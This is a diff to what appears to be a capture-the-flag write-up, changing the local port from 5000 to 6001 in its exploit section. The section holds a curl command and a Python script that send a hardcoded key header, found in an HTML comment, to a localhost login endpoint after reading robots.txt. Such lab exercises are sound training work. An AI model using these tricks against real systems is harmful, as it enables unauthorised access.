@@ -9,7 +9,7 @@ By analyzing html we can notice the following comment: ``` <!-- For web crawlers
 ## Exploit
 Bash:
 ```bash
-curl -X POST -H "X-Key-Header: My_key_is_not_so_secret" http://127.0.0.1:5000/login
+curl -X POST -H "X-Key-Header: My_key_is_not_so_secret" http://127.0.0.1:6001/login
 ```
 
 Python:
@@ -17,7 +17,7 @@ Python:
 import requests
 from bs4 import BeautifulSoup
 
-url = "http://127.0.0.1:5000"
+url = "http://127.0.0.1:6001"
 
 endpoint = requests.get(url + "/robots.txt").text.split(": ")[-1].strip()
 
